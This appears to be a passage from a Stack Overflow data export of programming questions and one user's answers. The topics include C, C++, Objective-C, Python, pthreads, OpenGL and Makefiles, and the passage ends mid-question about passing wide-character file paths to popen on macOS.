","9530","","<p>Try creating a Test User for the Chinese iTunes Store instead of the US iTunes Store on iTunes Connect and then logging in as that user.</p>
"
"<p>this is my problem: I'm using NON standard ANSI C (a modified r-tems for arm that compile with standard GCC) and i want add an extra tag in front of C types wich maintain the type property and add some ""stuff"". The final result will be something like this:</p>

<pre><code>REL char *p;
</code></pre>

<p>this is still a pointer to char and the compiler must treat like that, but now the REL tag will define that p is a RELiable pointer too.</p>

<pre><code>HP int a;
</code></pre>

<p>the same but now the HP tag will define this int as an HighPerformace int.</p>

<p>I have to change/modify the preprocessor? How?? </p>

<p>Thanks a lot</p>

<p>PS:that isn't very importat however by the specific of my project i can't use a simple #define because REL and HP tag will attached to a special hardware routine binded directly to the preprocessor. (this is the previously mentioned ""stuff"").</p>

<p>P.P.S I'm sorry for my bad English.   </p>
","9530","","<p>Use the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Variable-Attributes.html#index-g_t_0040code_007bsection_007d-variable-attribute-2622"" rel=""nofollow""><code>__attribute__((section(""SECTION"")))</code></a> attribute to tell GCC to place the variable in a specific section.  Then, use a <a href=""http://www.xgc.com/manuals/gcc-1750-ug/p5node5.html"" rel=""nofollow"">linker script</a> to ensure that the the appropriate sections get mapped to the appropriate places in memory.  For example:</p>

<pre><code>#define REL __attribute__((section(""REL"")))
#define HP __attribute__((section(""HP"")))

char *p REL;
int a HP;
</code></pre>

<p>I'm not super-familiar with linker scripts, so figuring out exactly how to do that is an exercise for the reader.</p>
"
"<p>I want to create an editor in C++ using SDL &amp; OpenGL and have decided to use the win32 api to access the window bar menus (for file, edit and so on) and it seems quite simple, but I don't know how to create a ""file-> open"" file browser/loader... I'm hoping it's quite simple but I'm finding it hard to look up any tutorials on google because of the phrasing...</p>

<p>I just want to have an ""open"" or ""import"" option in the file menu that will open a standard windows file browser... then grab the file location, place it into a string then pass it into a function that is activated by selection a file... (I hope that makes sense).</p>

<p>The method I'm using to create the win32 menus are from this post:
<a href=""http://www.gamedev.net/topic/400677-sdl-with-a-win32-menu/"" rel=""nofollow"">http://www.gamedev.net/topic/400677-sdl-with-a-win32-menu/</a></p>

<p>Half way down the page there is a comment by ""caseyd""... that's how I learnt how to use it, so that is my current understanding of win32 menus in SDL... I wanted to post the code here, but I didn't know how to paste it here in codeblocks without reformatting every line.</p>

<p>I'm hoping this is quite simple... Thanks to anyone who can teach me how or just point me in the right direction.</p>

<p>Oh, and I'm not trying to convert this to other operating systems, I just like SDL.</p>
","9530","","<p>Use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms646927%28v=vs.85%29.aspx"" rel=""nofollow""><code>GetOpenFileName()</code></a>.  Note that that function blocks until the user selects a file, so if you want to continue rendering etc. in the background, make sure to run it on a separate thread.</p>
"
"<p>I am reading the wrox Beginning Python book. In chapter 2, the example states</p>

<pre><code>&gt;&gt;&gt; print ""$.03f"" &amp; 30.00123
$30.001
</code></pre>

<p>However this does not explain the behavior of the command. Why use .03 when .3 and .003 etc have the same behavior in the shell? Furthermore, it does not explain what happends when I just use 3</p>

<pre><code>&gt;&gt;&gt; print ""%.03f"" % (2.34567891)
2.346
&gt;&gt;&gt; print ""%.003f"" % (2.34567891)
2.346
&gt;&gt;&gt; print ""%.0003f"" % (2.34567891)
2.346
&gt;&gt;&gt; print ""%.3f"" % (2.34567891)
2.346
&gt;&gt;&gt; print ""%3f"" % (2.34567891)
2.345679
</code></pre>

<p>I tried searching but couldnt get results as I dont know what the relevant keywords are.</p>
","9530","","<p>This is a feature known as <em>string formatting</em> or <em>string interpolation</em>.  Its documentation can be found <a href=""http://docs.python.org/library/stdtypes.html#string-formatting"" rel=""nofollow"">here</a>.  It works very similarly to the C function <a href=""http://linux.die.net/man/3/printf"" rel=""nofollow""><code>printf</code></a>'s format strings.</p>
"
"<p>How can I do reverse memory comparison? As in, I give the ends of two sequences and I want the pointer to be decremented towards the beginning, not incremented towards the end.</p>
","9530","","<p>There's no built-in function in the C standard library to do it.  Here's a simple way to roll your own:</p>

<pre><code>int memrcmp(const void *s1, const void *s2, size_t n)
{
    if(n == 0)
        return 0;

    // Grab pointers to the end and walk backwards
    const unsigned char *p1 = (const unsigned char*)s1 + n - 1;
    const unsigned char *p2 = (const unsigned char*)s2 + n - 1;

    while(n &gt; 0)
    {
        // If the current characters differ, return an appropriately signed
        // value; otherwise, keep searching backwards
        if(*p1 != *p2)
            return *p1 - *p2;
        p1--;
        p2--;
        n--;
    }

    return 0;
}
</code></pre>

<p>If you something high-performance, you should compare 4-byte words at a time instead of individual bytes, since memory latency will be the bottleneck; however, that solution is significantly more complex and not really worth it.</p>
"
"<p>Here is the code</p>

<pre><code>#include&lt;stdio.h&gt;
#include&lt;sys/types.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;pthread.h&gt;
typedef struct std_thread
{
 char name[20];
 int hallno;
 int empid;
 char dept[5];
}std[5];

void *print(void *args)
{
 struct std_thread *data=(struct std_thread *)args;
 printf(""My thread id is %ld\n"",pthread_self());
 printf(""Thread %d is executing\n"",args);
 printf(""Name\tHall No\tEmployee ID\tDepartment\n"");
 printf(""--------------------------------------------------------"");
 printf(""%s\t%d\t%d\t%s\n"",data-&gt;name,data-&gt;hallno,data-&gt;empid,data-&gt;dept);
}

int main()
{
 pthread_t th[5];
 int empid=2020;
 int hall=1;
 char dept[2]=""IT"";
 char *names[]={""dinesh"",""vignesh"",""pradeep"",""prasath"",""mohan""};
 int t;
 int i;
 int status;
 for(i=0;i&lt;5;i++)
 {
   std[i].name=names[i]; //Getting error from this line
   std[i].hallno=hall;   //Error at this line
   hall++;
   std[i].empid=empid;  //Error at this line
   empid++;
   std[i].dept=dept;     //Error at this line
   status=pthread_create(&amp;th[i],NULL,print,(void *)&amp;std[i]);
   if(status)
   {
    printf(""Error creating threads\n"");
    exit(0);
   }

 }
 pthread_exit(NULL);
}
</code></pre>

<p>While compiling this code, I'm getting ""syntax error before '[' token"". What is the reason for this?</p>
","9530","","<p>This declaration does not do what you think it does:</p>

<pre><code>typedef struct std_thread
{
  ...
}std[5];
</code></pre>

<p>This declares a <code>struct</code> named <code>std_thread</code>, and then it creates a <code>typedef</code> named <code>std</code> to mean ""an array of 5 <code>struct std_thread</code> objects"".</p>

<p>You probably wanted one of these two definitions, in order to declare a global object named <code>std</code> as an array of 5 <code>struct std_thread</code>'s:</p>

<pre><code>typedef struct std_thread
{
  ...
} std_thread;
std_thread std[5];

// OR

struct std_thread
{
  ..
} std[5];
</code></pre>

<p>In the first case, we also create the <code>typedef</code> named <code>std_thread</code> as an alias for <code>struct std_thread</code>; in the second case, we do not.</p>

<p>Furthermore, as others have stated, you cannot copy character arrays by assignment.  You must copy them using a function such as <a href=""http://linux.die.net/man/3/strcpy"" rel=""nofollow""><code>strcpy(3)</code></a> or <a href=""http://linux.die.net/man/3/strncpy"" rel=""nofollow""><code>strncpy(3)</code></a>.  When using <code>strcpy</code>, you must ensure that the destination buffer is large enough to hold the desired string.  Also keep in mind that <a href=""http://stackoverflow.com/questions/1453876/why-does-strncpy-not-null-terminate""><code>strncpy</code> does not necessarily null-terminate its destination string</a>, so use it with caution.</p>
"
"<p>I am new to Cocoa and Xcode, but I really do want to learn. The problem is that I spend a lot of my time doing work in scripting languages like PHP, perl, python, and shell scripting, and while Cocoa is a lot more powerful than running a shell script in Terminal on OS X, it is also a bit harder to get into.</p>

<p>I have a hypothesis though: If I can start using Cocoa and Xcode to actually do some things then I'll get more comfortable with it and gradually start to unlock more and more of it's potential.</p>

<p>That's where I hope StackOverflow comes in. See, I'm used to writing scripts that take paramaters (mostly file names) as inputs, and act on them - either dispatching other programs or reading and writing to the text-based contents. So with that in mind, <strong>How can I write a simple Cocoa application that will accept input, save that input to a file, and launch a system command?</strong></p>

<p>Desired input:</p>

<pre><code>open -a MyApp.app --args ""hello world""
</code></pre>

<p>Desired output:</p>

<ul>
<li>File <code>/tmp/test.txt</code> is created and now contains text <code>hello world</code></li>
<li>The php version is checked by running <code>/usr/bin/php -v</code> and the output is then appended to <code>/tmp/test.txt</code> (just wanted to call some system command)</li>
</ul>

<p>I know this sort of thing is very easy to do with just 1-2 lines of something like bash scripting, but I'd really like to see if I could make this happen in a Cocoa app. I apologize in advance because I realize this is very much a noob question - just trying to get started in a way that feels familiar.</p>
","9530","","<p>If you're writing a purely input/output type of application that doesn't have an UI, just write a straight Unix-style application in C/C++/Objective-C (whichever you prefer).  Your program's arguments will show up in the <code>argc</code> and <code>argv</code> parameters that get passed to your <code>main</code> function:</p>

<pre><code>int main(int argc, char **argv)
{
    // argc is the total number of arguments (including the program name)
    // argv[0] is the first argument (the program name)
    // argv[1] is the second argument (first real argument)
    // ...
    // argv[argc-1] is the last argument
}
</code></pre>

<p>If you do have a real UI, typically the <code>main</code> function is autogenerated by Xcode and placed in a file named <code>main.m</code>—it's a stub function that calls <code>NSApplicationMain</code> with an autorelease pool around it.  You can modify this to save off <code>argc</code> and <code>argv</code> and/or process them right there.</p>
"
"<p>What is the easiest and simplest way to create a decrementing timer in seconds?</p>

<p>Im using an 8bit microcontroller and cannot use float points or intensive processes. I need a very efficient timer.</p>
","9530","","<p><a href=""http://linux.die.net/man/2/time"" rel=""nofollow""><code>time(2)</code></a> is a standard C function for obtaining the current time in seconds since the epoch (midnight on January 1, 1970 UTC).  To make a decrementing timer, you could do something like this:</p>

<pre><code>time_t startTime = time(NULL);

time_t timerDuration = 10;  // 10 second timer
time_t endTime = startTime + timerDuration;
while(1)
{
    time_t currTime = time(NULL);
    time_t timeLeft = endTime - currTime;

    if(timeLeft &lt; 0)
    {
        // timer has finished
        break;
    }

    // do stuff - preferably don't spin at 100% CPU
}
</code></pre>

<p>If you need more precision than 1-second increments, you can use a platform-specific function such as <a href=""http://linux.die.net/man/3/gettimeofday"" rel=""nofollow""><code>gettimeofday(3)</code></a> (POSIX) or <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms724338%28v=vs.85%29.aspx"" rel=""nofollow""><code>GetLocalTime</code></a> (Windows).</p>
"
"<p>I'm asked to write a program that will have 2 threads and print 5 random integers such that the first thread will generate a number, the second will print it. Then the first will generate the 2nd number, the second thread will print it... etc. using a mutex.</p>

<p>My code now execute it for one cycle. How can I extend it to make threads excute the methods  5 times?</p>

<pre><code>#include &lt;pthread.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void* generate (void*);
void* print (void*);

pthread_mutex_t m;
int number = 5;
int genNumber;


int main()
{
    int i;
    srandom(getpid());
    pthread_t th[2];

    pthread_mutex_init(&amp;m,NULL);

    pthread_create(&amp;th[0],NULL,generate,NULL);
    pthread_create(&amp;th[1],NULL,print, NULL);

    for (i = 0; i &lt; 2; i++)
        pthread_join(th[i], NULL);

    pthread_mutex_destroy(&amp;m);

    return 0;
}

void* generate(void* arg)
{
    pthread_mutex_lock(&amp;m);
    genNumber = random() % 9;
    printf(""Generated #1 \n"");
    pthread_mutex_unlock(&amp;m);
}

void* print(void* arg)
{
    pthread_mutex_lock(&amp;m);
    printf(""The number is %d "" , genNumber);
    pthread_mutex_unlock(&amp;m);
    pthread_exit(NULL);
}
</code></pre>
","9530","","<p>Use <a href=""https://computing.llnl.gov/tutorials/pthreads/#ConditionVariables"" rel=""nofollow"">condition variables</a> to synchronize the two threads.  When a thread has completed its work, it signals to the other thread to wake up, and then it goes to sleep to wait for more work.  So something like this:</p>

<pre><code>// Pseudocode
pthread_cond_t c1, c2;
pthread_mutex_t mutex;

// Thread 1 (producer):
for(int i = 0; i &lt; 5; i++)
{
    lock(mutex);
    genNumber = random() % 9;
    signal(c2);
    wait(c1, mutex);
    unlock(mutex);
}

// Thread 2 (consumer):
for(int i = 0; i &lt; 5; i++)
{
    lock(mutex);
    wait(c2, mutex);
    print(""The number is %d\n"", genNumber);
    signal(c1);
    unlock(mutex);
}
</code></pre>
"
"<pre><code>PlistReader *pList = [[PlistReader alloc] init];
    [pList initWithFileName:@""CountryDetails""];
    CountryClass *objcountry =(CountryClass*) [pList getCountryInfoById:countryId];
    CCSprite *flag = [CCSprite spriteWithFile:objcountry.ImageUrl];
    flag.position = ccp(200, 265);
    flag.scale = .255;
    NSString *tempdata = objcountry.ShortDetail;//error line sigabrt
    TextViewTopFlagData = [[UITextView alloc]init];
    TextViewTopFlagData.text = [NSString stringWithFormat:@""this is pakistan""];//countryInfo.ShortDetail;
    TextViewTopFlagData.frame = CGRectMake(260,17, 105, 75);
    TextViewTopFlagData.backgroundColor = [UIColor clearColor];
    [TextViewTopFlagData setEditable:NO];
</code></pre>

<p>hi i am getting error sigabrt on line which i mention it objcountry.ShortDetail is also NSString type so why it is getting error here sigabrt can any one help </p>

<p>when i put the NSString *tempdata = objcountry.ShortDetail;//error line sigabrt before the sprite line it got no error but when i put back after the sprite line it again got that error so can any one explain me that </p>

<p>here is the countryClass structer</p>

<p>//CountryClass.h</p>

<pre><code>//
//  CountryClass.h
//  NationalAntemsAndFlags
//
//  Created by mac on 12/17/11.
//  Copyright (c) 2011 __MyCompanyName__. All rights reserved.
//

#import &lt;Foundation/Foundation.h&gt;

@interface CountryClass : NSObject
{
    NSString *Name ;
    NSString *ImageUrl;
    NSString *AnthemUrl;
    NSString *ShortDetail;
    NSString *completeDetails;
    int LocationX ;
    int LocationY ;


}
@property (nonatomic,retain) IBOutlet NSString *Name;
@property (nonatomic,retain) IBOutlet NSString *ImageUrl;
@property (nonatomic,retain) IBOutlet NSString *AnthemUrl;
@property (nonatomic,retain) IBOutlet NSString *ShortDetail;
@property (nonatomic,retain) IBOutlet NSString *completeDetails;
@property (nonatomic) IBOutlet int LocationY;
@property (nonatomic) IBOutlet int LocationX;




@end
</code></pre>

<p>//countryClass.m</p>

<pre><code>//
//  CountryClass.m
//  NationalAntemsAndFlags
//
//  Created by mac on 12/17/11.
//  Copyright (c) 2011 __MyCompanyName__. All rights reserved.
//

#import ""CountryClass.h""

@implementation CountryClass

@synthesize Name,ImageUrl,AnthemUrl,ShortDetail,completeDetails,LocationX,LocationY;

@end
</code></pre>

<p>this is the countryClass structure and i did tried to [countryInfo retain] but nothing happend </p>
","9530","","<p><code>objcountry</code> is not an actual instance of a <code>CountryClass</code>, it's some other type of object (whatever <code>[pList getCountryInfoById:country]</code> returns).  If it's not obvious from the code what type of object it is, try printing it out with <code>NSLog(@""objcountry is a %@"", [objcountry class]);</code>.</p>

<p>The expression <code>objcountry.ShortDetail</code> is syntactic sugar for the property accessor method <code>[objcountry ShortDetail]</code>.  When the runtime tries to send the message <code>ShortDetail</code> to the obejct but the object doesn't respond to that message, the dreaded <code>NSInvalidArgumentException</code> gets thrown with the message ""unrecognized selector sent to class"" (this should get printed to the debug console).  If nobody catches that exception (as is often the case), the runtime responds by calling the <a href=""http://linux.die.net/man/3/abort"" rel=""nofollow""><code>abort(3)</code></a> method, which terminates the application with the <code>SIGABRT</code> signal.</p>
"
"<p>I would like to check how many files are there in the specified directory. For instance I would have a directory next to my .exe called <code>resources</code> and I would like to check how many of .txt files are located in it.</p>

<p>How this can be done in C++ in Windows? </p>
","9530","","<p>This depends on the operating system.  On Windows, you would use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa364418%28v=vs.85%29.aspx"" rel=""nofollow""><code>FindFirstFile</code></a> and <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa364428%28v=vs.85%29.aspx"" rel=""nofollow""><code>FindNextFile</code></a> to enumerate the directory contents, using an appropriate filter such as <code>""*.txt""</code>.  Don't foget to call <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa364413%28v=vs.85%29.aspx"" rel=""nofollow""><code>FindClose</code></a> when you're done.</p>

<p>On Unix-based operating systems, you would use <a href=""http://linux.die.net/man/3/opendir"" rel=""nofollow""><code>opendir(3)</code></a> and <a href=""http://linux.die.net/man/3/readdir"" rel=""nofollow""><code>readdir(3)</code></a> to enumerate the directory contents.  You'll have to filter the file names yourself.  Don't forget to call <a href=""http://linux.die.net/man/3/closedir"" rel=""nofollow""><code>closedir(3)</code></a> when you're done.</p>
"
"<p>I am trying to read a file ""file.raw"" and 4 bytes at a time to an array and check if it has the particular 4 byte signature I am looking for.  I am having trouble with this. The value of result I get is 0, instead of 4 when using fread. </p>

<pre><code>#include&lt;stdint.h&gt; 
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;string.h&gt;

typedef uint8_t BYTE; 

int main(void)
{
    size_t result;
    FILE *inptr = fopen(""file.raw"",""r+"");
    //Check if file can be opened.
    if (inptr == NULL)
    {
        printf(""File Open Error\n"");
        return -1;
    }
    long int x = 0;

    while(!feof(inptr))
    {
        // Make space for reading in to an array
        BYTE *array = (BYTE *) malloc(10);
        if(array == NULL)
        {
            printf(""Array Initialization Error\n"");
            return -1;
        }

        result = fread(array,1,4,inptr);
        //Exit if file not read. ** This is where I can't get past.
        if(result != 4)
        {
            printf(""File Read Error\n"");
            printf(""%d\n"",result);
            free(array);
            fclose(inptr);
            return -1;
        }

        //Compare strings

        if(memcmp(array,""0xffd8ffe0"",4)==0)
        {
            printf(""File Start found\n"");
            printf(""Exiting...\n"");
            printf(""%p\n"",inptr);
            free(array);
            fclose(inptr);
            return 0;
        }
        x++;
        free(array);
    }

    printf(""%p\n"",inptr);
    printf(""%ld\n"",x);
    fclose(inptr);
    return 0;
}
</code></pre>
","9530","","<p>Try opening the file in binary mode (<code>""r+b""</code>) instead of text mode (<code>""r+""</code>).  You're probably being undone by unintentional CRLF conversions, messing up your binary data.</p>
"
"<p>I am programming a robot in C, and I have run into a problem I can't seem to figure out.</p>

<p>The only way to solve this problem would be to use a lot of <code>goto</code> statements.
I am trying to figure out a way to save myself writing over 100 <code>goto</code> points and statements and if statements, etc. and am wondering if there is a way to goto the value of a string. for example-</p>

<pre><code>string Next = ""beginning"";
goto Next;
beginning:
</code></pre>

<p>Is there any way to <code>goto</code> the value of <code>Next</code>, or to substitute in the value of <code>Next</code> into the <code>goto</code> statement?</p>

<p>If there is a way to do this, then I will be able to just change the value of <code>Next</code> for each driving command, and then <code>goto</code> whatever the value of the string <code>Next</code> is.</p>

<p>In other words, just converting the string to a <code>goto</code> identifier, or substituting it in place of one.</p>

<p>Thanks for the help!</p>

<p>-EDIT-</p>

<p>A lot of you guys are suggesting the use of switch statements. I am not sure this would work because of how i have it programmed. The structure of the program is here--
by the way this code only includes a little of what i actually have, my real code is over 500 lines so far. Also, the driving commands are majorly simplified. but the basic concept is here, easier to understand than what i wouldve had.</p>

<pre><code>task main()
{
  //integer list
  int forwardDrivingSelector = 0;
  int backwardDrivingSelector = 0;
  int rightRotatingSelector = 0;
  string nextCommand;
  int waitTime = 0;
  int countup = 0;

  //driving commands

  driveForward:
  while(forwardDrivingSelector == 1)
  {
    motor[leftMotor] = 127;
    motor[rightMotor] = 127;
    countup++;
    wait1Msec(1);
    if(countup == waitTime)
    {
      countup = 0;
      goto nextCommand;
    }
  }
  driveBackward:
  while(backwardDrivingSelector == 1)
  {
    motor[leftMotor] = -127;
    motor[rightMotor] = 127;
    countup++;
    wait1Msec(1);
    if(countup == waitTime)
    {
      countup = 0;
      goto nextCommand;
    }
  }
  rightRotate:
  while(rightRotatingSelector == 1)
  {
    motor[leftMotor] = 127;
    motor[rightMotor] = -127;
    countup++;
    wait1Msec(1);
    if(countup == waitTime)
    {
      countup = 0;
      goto nextCommand;
    }
  }

  //autonomous driving code

  //first command, drive forward for 1000 milliseconds
  forwardDrivingSelector = 1;
  nextCommand = ""secondCommand"";
  waitTime = 1000;
  goto driveForward;

  secondCommand:
  forwardDrivingSelector = 0;

  //second command, rotate right for 600 milliseconds
  rightRotatingSelector = 1;
  nextCommand = ""thirdCommand"";
  waitTime = 600;
  goto rightRotate;

  thirdCommand:
  rightRotatingSelector = 0;

  //third command, drive backwards for 750 milliseconds
  backwardDrivingSelector = 1;
  nextCommand = ""end"";
  waitTime = 750;
  goto driveBackward;

  end:
  backwardDrivingSelector = 0;

}
</code></pre>

<p>so. how this works.
i have a list of integers, including driving command selectors, the countup and waitTime integers, and the string that i was talking about, nextCommand.
next comes the driving commands. in my real code, i have about 30 commands, and they are all hooked up to a remote control and its over 400 lines for just the driving commands.
next comes the autonomous code. the reason i set it up like this is so that the autonomous code part would be, short, simple, and to the point. pretty much to add a command to the driving code, you turn on the selector, tell the nextCommand string what the next command is, set the waitTime (which is how long it does the command, in milliseconds), then you make the code goto the driving command which you are putting in. the driving command drives for the amount of time you put in, then does goto nextCommand;</p>

<p>This would all theoretically work if there was a way to make the goto statement 'interpret' the string as an identifier so it can be changed.</p>

<p>There are about 4 simple ways i can think of right now that could get past this easily, but they would make the code really really long and cluttered.</p>

<p>Now that you have a better understanding of my question, any more input? :)</p>

<p>btw - i am using a program called robotC, and i am programming a vex robot. so i HAVE to use plain, basic, C, and i cant use any addons or anything... which is another reason this is complicated because i cant have multiple classes and stuff like that...</p>
","9530","","<p>As an extension to the C language, GCC provides a feature called <a href=""http://gcc.gnu.org/onlinedocs/gcc-3.2/gcc/Labels-as-Values.html"" rel=""nofollow""><em>computed gotos</em></a>, which allow you to <code>goto</code> a label computed at runtime.  However, <strong>I strongly recommend you reconsider your design</strong>.</p>

<p>Instead of using <code>gotos</code> with over a hundred labels (which will easily lead to unmaintainable spaghetti code), consider instead using function pointers.  The code will be much more structured and maintainable.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/538609/high-resolution-timer-with-c-and-linux"">High resolution timer with C++ and Linux?</a>  </p>
</blockquote>



<p><code>double hires_time_in_seconds();</code></p>

<p>I'm looking for this function for Windows, Linux too if you have it.
It is mentioned in <a href=""http://gafferongames.com/game-physics/fix-your-timestep/"" rel=""nofollow"">http://gafferongames.com/game-physics/fix-your-timestep/</a>.
I've looked on the web.
I know it's not a standard function but if anybody has an implementation that they want to share, that would be great.</p>

<p>Failing that, I need something as fine grained as possible to do synchronization in a client server game.</p>
","9530","","<p>It's not a real function, it's just a self-descriptive placeholder name used in that blog post's example code.</p>

<p>For Windows, you'll want to use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms644904%28v=vs.85%29.aspx"" rel=""nofollow""><code>QueryPerformanceCounter</code></a> along with <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms644905%28v=VS.85%29.aspx"" rel=""nofollow""><code>QueryPerformanceFrequency</code></a>.  For Unix-based OSes, you'll want to use <a href=""http://linux.die.net/man/3/gettimeofday"" rel=""nofollow""><code>gettimeofday(3)</code></a>.</p>
"
"<p>We have a data entry person who encoded in UTF-16 on Windows and would like to have utf-8 and remove the BOM. The utf-8 conversion works but BOM is still there. How would I remove this? This is what I currently have:</p>

<pre><code>batch_3={'src':'/Users/jt/src','dest':'/Users/jt/dest/'}
batches=[batch_3]

for b in batches:
  s_files=os.listdir(b['src'])
  for file_name in s_files:
    ff_name = os.path.join(b['src'], file_name)  
    if (os.path.isfile(ff_name) and ff_name.endswith('.json')):
      print ff_name
      target_file_name=os.path.join(b['dest'], file_name)
      BLOCKSIZE = 1048576
      with codecs.open(ff_name, ""r"", ""utf-16-le"") as source_file:
        with codecs.open(target_file_name, ""w+"", ""utf-8"") as target_file:
          while True:
            contents = source_file.read(BLOCKSIZE)
            if not contents:
              break
            target_file.write(contents)
</code></pre>

<p>If I hexdump -C I see:</p>

<pre><code>Wed Jan 11$ hexdump -C svy-m-317.json 
00000000  ef bb bf 7b 0d 0a 20 20  20 20 22 6e 61 6d 65 22  |...{..    ""name""|
00000010  3a 22 53 61 76 6f 72 79  20 4d 61 6c 69 62 75 2d  |:""Savory Malibu-|
</code></pre>

<p>in the resulting file. How do I remove the BOM?</p>

<p>thx</p>
","9530","","<p>Just use <a href=""http://docs.python.org/library/stdtypes.html#str.decode""><code>str.decode</code></a> and <a href=""http://docs.python.org/library/stdtypes.html#str.encode""><code>str.encode</code></a>:</p>

<pre><code>with open(ff_name, 'rb') as source_file:
  with open(target_file_name, 'w+b') as dest_file:
    contents = source_file.read()
    dest_file.write(contents.decode('utf-16').encode('utf-8'))
</code></pre>

<p><code>str.decode</code> will get rid of the BOM for you (and deduce the endianness).</p>
"
"<p>Why does the following result in a BAD_ACCESS error?</p>

<pre><code>NSDictionary *header=[[NSDictionary alloc]initWithObjectsAndKeys:@""fred"",@""title"",1,@""count"", nil];
</code></pre>

<p>Can you have different types of objects as values in NSDictionary, including another NSDictionary?</p>
","9530","","<p>An <code>NSDictionary</code> can only contain Objective-C objects in it (such as <code>NSString</code> and <code>NSArray</code>), it cannot contain primitive types like <code>int</code>, <code>float</code>, or <code>char*</code>.  Given those constraints, heterogeneous dictionaries are perfectly legal.</p>

<p>If you want to include a number such as <code>1</code> as a key or value, you should wrap it with an <code>NSNumber</code>:</p>

<pre><code>NSDictionary *header=[[NSDictionary alloc] initWithObjectsAndKeys:
    @""fred"", @""title"",
    [NSNumber numberWithInt:1], @""count"",
    nil];
</code></pre>
"
"<p>I've been having some problems compiling this code for mergesort on an array of custom data types. The undefined reference is in response to </p>

<pre><code>mergesort(hw1type*, int)
</code></pre>

<p>Here are the relevant code snips leaving out the includes, and what not, which I know all work:</p>

<p>Main (Where the error is propagating to):</p>

<pre><code>hw1type * unsorted_array2 = new hw1type[SIZE];

unsorted_array2 = create_random_hw1type(SIZE);

mergesort(unsorted_array2, SIZE);
</code></pre>

<p>mergesort.h:</p>

<pre><code>hw1type* mergesort(hw1type*, int);
hw1type* merge(hw1type*, int, hw1type*, int);
</code></pre>

<p>mergesort.cc:</p>

<pre><code>hw1type mergesort(hw1type* unsorted_array, int n)
</code></pre>

<p>I can't see anything wrong with the way the functions are declared, or the way I'm passing the variables in main. But, it's been a while since I've used c++ so I could use a second or third pair of eyes! </p>

<p>Edit: Turns out it was the make file, I forgot to change. It's always something simple. </p>

<p>Ah, right, I was using the standard make file that came with the other classes.Anyway, here's that code:</p>

<p>I should probably throw mergesort.o into the list of OBJs, but anything else? The make file looks like this: </p>

<pre><code>CC=gcc
CXX=c++
CFLAGS=-ggdb -O3 -I. 
LDFLAGS=-L. -lcs600

OBJ=timer.o random_generator.o sort.o

cs600:  libcs600.a main.o
    $(CXX) $(CFLAGS) main.o -o hw1 $(LDFLAGS)

libcs600.a: $(OBJ)
    ar ru libcs600.a $(OBJ)
    ranlib libcs600.a

.cc.o:
    $(CXX) -c $(CFLAGS) $&lt;


clean:
    @rm -f *.o
    @rm -f libcs600.a
    @rm -f hw1
</code></pre>

<p>I need to add mergesort.o to the OBJ field, but anything other than that? Considering it's been a while for C++, it's really been a while since I've messed around with make files. </p>
","9530","","<p>You're not compiling <code>mergesort.cc</code> into object code, and/or you're not linking in that object code.</p>

<p>If you're using an IDE, make sure you've added <code>mergesort.cc</code> to your project configuration; if you're using Makefiles or compiling on the command line, make sure you include that in the list of source files you're compiling.</p>
"
"<p>I'm trying to do a screen capture in GLUT and I'm having a bit of an issue. glReadPixels() seems to crash my program with an </p>

<pre><code>Access violoation writing location 0x00000000
</code></pre>

<p>The thing that is weird is the file is created in the root of the project, and is obviously empty. I set up some printf commands quickly and it appears that the code crashes each time during the glReadPixels() method.</p>

<p>I feel the issue maybe the variable 'pixels'. Im having trouble figuring out the correct way to define this so that the RGB values are written to it.</p>

<p>Any tips would be appreciated.</p>

<pre><code>void savePPM(char ppmFileName[]){
    int width = glutGet(GLUT_WINDOW_WIDTH);
    int height = glutGet(GLUT_WINDOW_HEIGHT);
    char *pixels = NULL;

    glReadPixels(0,0, width, height, GL_RGB, GL_UNSIGNED_BYTE ,pixels);

    ppmFile = fopen(ppmFileName, ""wb"");

    fprintf(ppmFile, ""P6\n"");
    fprintf(ppmFile, ""%d %d\n"", width, height);
    fprintf(ppmFile, ""255\n"");
    fwrite(pixels, 1, width*height*3, ppmFile);

    fclose(ppmFile);
    free(pixels);
}
</code></pre>
","9530","","<p><code>glReadPixels</code> doesn't allocate memory for you, it merely stores the pixel data in the buffer that you give it in the last parameter.  You're giving it a NULL pointer, so it's trying to store data at address 0, which obviously results in an access violation.</p>

<p>You need to allocate the memory first, pass it to <code>glReadPixels</code>, and then deallocate it.  You also need to make sure that you call <a href=""http://www.khronos.org/opengles/sdk/docs/man/xhtml/glPixelStorei.xml"" rel=""nofollow""><code>glPixelStorei</code></a> to ensure that the pixel data is returned packed, without any padding (alternatively, you can write each scan line individually, but that requires a little extra effort).</p>

<p>For example:</p>

<pre><code>// Error checking omitted for expository purposes
char *pixels = malloc(width * height * 3);  // Assuming GL_RGB
glPixelStorei(GL_PACK_ALIGNMENT, 1);
glReadPixels(..., pixels);
...
fwrite(pixels, ...);
...
free(pixels);
</code></pre>
"
"<p>I'm trying to execute a program on a file using the popen() command on a Mac. For this, I create a command of the form <code>&lt;path-to_executable&gt; &lt;path-to-file&gt;</code> and then call popen() on this command. Right now, both these two components are declared in a char*. I need to read the output of the command so I need the pipe given by popen().</p>

<p>Now it turns out that path-to-file can contain Chinese, Japanese, Russian and pretty much any other characters. For this, I can represent the path-to-file as wchar_t*. But this doesn't work with popen() because apparently Mac / Linux don't have a wide _wpopen() like Windows.</p>

<p>Is there any other way I can make this work? I'm getting the path-to-file from a data structure that can only give me wchar_t* so I have to take it from there and convert it appropriately, if needed.</p>

<p>Thanks in advance.</p>

<p><strong>Edit:</strong></p>

<p>Seems like one of those days when you just end up pulling your hair out.</p>

<p>So I tried using wcstombs, but the setlocale call failed for ""C.UTF-8"" and any of its permutations. Unsurprisingly, the wcstombs call failed returning -1 after that.</p>

<p>Then I tried to write my own iconv implementation based on some sample codes searched on Google. I came up with this, which stubbornly refuses to work:</p>

<pre><code>iconv_t cd = iconv_open(""UTF-8"", ""WCHAR_T"");
// error checking here

wchar_t* inbuf = ...; // get wchar_t* here
